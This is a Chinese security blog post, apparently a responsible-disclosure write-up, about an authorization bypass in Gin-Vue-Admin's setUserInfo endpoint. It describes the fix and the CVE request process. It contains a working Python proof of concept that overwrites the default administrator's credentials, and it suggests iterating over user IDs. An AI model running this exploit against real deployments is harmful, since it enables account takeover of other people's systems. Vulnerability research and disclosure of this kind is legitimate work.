主要的鉴权操作都在 cashbin.rbac.go 这个文件中的 CasbinHandler 函数，中的 casbinService.Casbin() 和 e.Enforce(sub, obj, act)

我对这里的越权理解是，如果给了设置用户信息的权限，那么默认这个用户在权限规则中就可以修改用户信息，然后在修改的时候，替换成别人的 ID 即可修改为别人的。

到这里可以明白了，首先鉴权判断的是 AuthorityId，来判断用户是否有权限操作某个接口。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffna56g6icaBrojicVMFSuiaCNRmiasDg1NaDuUYGiaGiaykGib0SKfVlOwXdymw/640?wx_fmt=png)

但是在 setuserinfo 使用的 ID 却是用户的账号 ID

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffniccibQBjRJZUdnQBiaFI8dSzW5XJCHamD1iamUzAqc4gvWuPh4eC7jibN4w/640?wx_fmt=png)

所以就导致了越权，因为这个 ID 可以前端传入的时候可以控制，并且也已经鉴权之后了，在与作者沟通之后，解释说修复也比较简单，只需要将 user.id 强制赋值为 JWT 所对应的权限 ID 即可，这样就不会造成越权了，因为前端怎么传入，最终在代码中还是有一行会将 user.id 的值修改为当前 JWT 所对应的 id。

但是在业务流程逻辑中，这些权限又是必须给的，因为不给的话，当前用户是没有办法修改自己的信息的。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnpXrGK2sXvVVKNKGjpMmVqsdibsjtbw02XwUADOIJV6dFKZKY62QLNHA/640?wx_fmt=png)

**POC 编写**

```
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
@Project ：UzJuSecurityTools 
@File    ：Gin-Vue-Admin-Poc.py
@Author  ：UzJu
@Date    ：2021/12/31 11:20 
@Email   ：UzJuer@163.com
'''

import requests
import json
import sys


class GinVueAdminPoc:
    def __init__(self, url, token):
        self.url = url
        self.jwt_token = token
        '''
        define vuln interface
        '''
        # Method PUT Severity High
        self.setUserInfo = "/api/user/setUserInfo"
        # Method POST Severity Moderate
        self.changePassword = "/api/user/changePassword"

    def checkVuln(self):
        '''
        因为默认管理员的用户ID为1，所以，这里直接修改ID为1的用户账号为admin，密码为qwe@123
        在实际使用中，可以通过遍历ID，来判断哪个ID用户存在，不过默认用户在实战中应该都是存在的
        The default user ID of the administrator is 1. Therefore, change the account of user 1 to admin and the password to qwe@123
        In practice, you can check which ID exists by iterating through the ID, but the default user should exist in practice
        '''
        payload_data = {
                            "id": 1,
                            "username": "admin",
                            "nickName": "超级管理员",
                            "Password": "qwe@123"
                        }
        # Change the administrator password to qwe@123, because the default administrator ID is 1
        headers = {
            "x-token": self.jwt_token
        }
        result = requests.put(url=self.url + self.setUserInfo,
                              headers=headers,
                              data=json.dumps(payload_data)
                              )
        if json.loads(result.content)['code'] == 7:
            print("[-]Modify the failure")
        elif json.loads(result.content)['code'] == 0:
            print(f"[+]Modify the success, Account: {payload_data['username']}, password: {payload_data['Password']}")

    def check_interface_ChangePassword(self):
        '''
        wait
        '''
        pass


if __name__ == '__main__':
    try:
        Banner_2 = '''
    
         /$$   /$$              /$$$$$          
        | $$  | $$             |__  $$          
        | $$  | $$ /$$$$$$$$      | $$ /$$   /$$
        | $$  | $$|____ /$$/      | $$| $$  | $$
        | $$  | $$   /$$$$/  /$$  | $$| $$  | $$
        | $$  | $$  /$$__/  | $$  | $$| $$  | $$
        |  $$$$$$/ /$$$$$$$$|  $$$$$$/|  $$$$$$/
         \______/ |________/ \______/  \______/                   
             Autor: UzJu   Email: UzJuer@163.com  GitHub: github.com/uzju  
        '''
        print(Banner_2)
        url = sys.argv[1]
        jwt_token = sys.argv[2]
        main = GinVueAdminPoc(url, jwt_token)
        main.checkVuln()
    except:
        print("[-]please input url and token")
```

为什么 check_interface_ChangePassword 这个方法没写是因为，这里算是一个暴力破解的一个接口，因为在修改任意用户的密码之前，必须知道需要修改的那个账号的密码，这就像是暴力破解。

所以这里并没有写，然后就是 checkvuln 这个方法，payload_data 这个 json 数据中的 id，其实可以任意更改的，也可以写成 for 循环进行遍历，因为在实际环境中并不确定管理员的 ID 是否为 1，或者说存在恶意破坏的话，也可以造成一定的影响。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnUiaTvmFibProhvv4osiahOMhsbyTmdnG7HAgfxHicibvLUibWl9gufoVD7vQ/640?wx_fmt=png)

**CVE 申请**

CNVD 的就不用说了吧，肯定也已经提交了，这里申请 CVE 的。

GitHub 代申请编号来的特别快，基本上最多 3 天，这里是当天提交的次日凌晨就收到了 CVE 的预分配编号。

以下操作需要联系作者帮你操作，不然没有 New Draft security advisory 这个按钮。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnOcO3EKRapvCk0QLxvrIUWJiaqTDfY83PFZULuSUHQUgwyHhUgWBSKzA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnRCRBzMkvazk4KjTrKhCnreE1knbZsuUiczQfZjDfOK3lCZaouwL1fZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffnBbpbgvYm6JUq7WKnsibicm1oplRIMk0yOearfLXyXjN83DqfJDmDQicaA/640?wx_fmt=png)

Description 写上漏洞的内容，复现过程，POC 就行，然后点击 create draft security advisory。

由于当时我们是第一次申请这个，犯了一个错误，只列出了一个草稿，并没有请求，导致我们白白等了 7 天。

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn1DmGFtNs8lVTrBYEZjn68azUokWjiagiaGrMHlic6gn0sBoQreKOWFp8Q/640?wx_fmt=png)

写完了一定要拉到下面，去点击 request cve id

![](https://mmbiz.qpic.cn/mmbiz_png/u36bf2PyN0fzkdUsZzHGxo4w4miadTffn15rb01lbOvLyd8fhOibNH3ttkkhy954EyZD6fF37Kicg2WNurrryt25Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaQbQiare6CUFsJJNia64anjfnjw9ea3hWuHqCmQTcbToYRyKqurH5s4ib5BPzzmsXys7PvyBUNj7fDkg/640?wx_fmt=jpeg)

**参考文章：**

Medicean——记录一下代白帽子申请 CVE 的过程  

**致 谢**

作者团队主页：

https://github.com/flipped-aurora/

作者的 GitHub：

https://github.com/piexlmax

Gin-vue-admin

项目地址：

https://github.com/flipped-aurora/gin-vue-admin

**【火线—白帽技术交流群】**

进群可以与技术大佬互相交流

进群有机会免费领取节假日礼品

进群可以免费观看技术分享直播

识别二维码回复【**交流群**】进群

⬇️

![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSWtU1mRCyFS9jLCibqqYRJGAcdibJg0Eepkpju9MxYiciadmeOtibMvUuiaXPMKibOZeGJicgGlBJpubjNwg/640?wx_fmt=jpeg)

**【火线 zone 社区周激励】**

2021.12.27 ～ 2022.1.3 公告

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSWtU1mRCyFS9jLCibqqYRJGhlUqqkz28uCpWacf1jCRft3SBrMKG07XLQLMzJhwfSoNHKV3QfCkXg/640?wx_fmt=png)

**【相关精选文章】**

[![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQbQiare6CUFsJJNia64anjfnIYgRqm10SobogWFoN5WLaDDIFlian0SqGE9IceNT4mxJrwpDY4sXczg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247491070&idx=1&sn=2cba466e9308edaba80a33c8d2e7ecf4&chksm=eaaa95dedddd1cc8c286ea81e789e5f813ff580d37882db5de8e61dcb752f015fe9b373544ad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaRZiaqWxOF7ibbIJF6SfMtCaHOEBoXh4ibg8MeKicIibOWQUnTcVQQZafjKYGeE5WgDLEuhvG3lCYfkQhQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247491014&idx=1&sn=4baacc4c5a86517cb257a2e03300f323&chksm=eaaa95e6dddd1cf07da1141c65c0a2a647398fe9294eeb0f28227dee4f8ab0419e6276a7d7a8&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSWtU1mRCyFS9jLCibqqYRJGM7OMqSIWZQgMFdpfd2844kzoCQKQKH94LMLRTibfY5lMpQFTH7Tkxpg/640?wx_fmt=png)

火线 Zone 是 [火线安全平台] 运营的封闭式实战安全攻防社区，研究讨论实战攻防技术，平台向顶尖的白帽子提供安全测试的云端基础设施，目前火线的高级白帽子数量已经近万人，欢迎具备分享和探索精神的白帽子加入火线 Zone 社区，共建一个有技术氛围的优质社区！

如需转载火线 Zone 公众号内的文章请联系火线小助手：hxanquan（微信）

![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSWtU1mRCyFS9jLCibqqYRJG4czKK4lbLmH7IBZsibh1BVaZRcjaJaKxvnUicDic56VpCBvoFNt6QW7KQ/640?wx_fmt=jpeg)

 **微信号** 

huoxian_zone

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/YxSSnpu6MW0CIoKC0f9U1ALN0bHmzzVfdqHmAlujAniaYos5t6H3zUomx1QoILFNCMdeV5eknVH2AfsYvjfV6iag/640?wx_fmt=gif)

点击阅读原文，加入社区，共建一个有技术氛围的优质社区！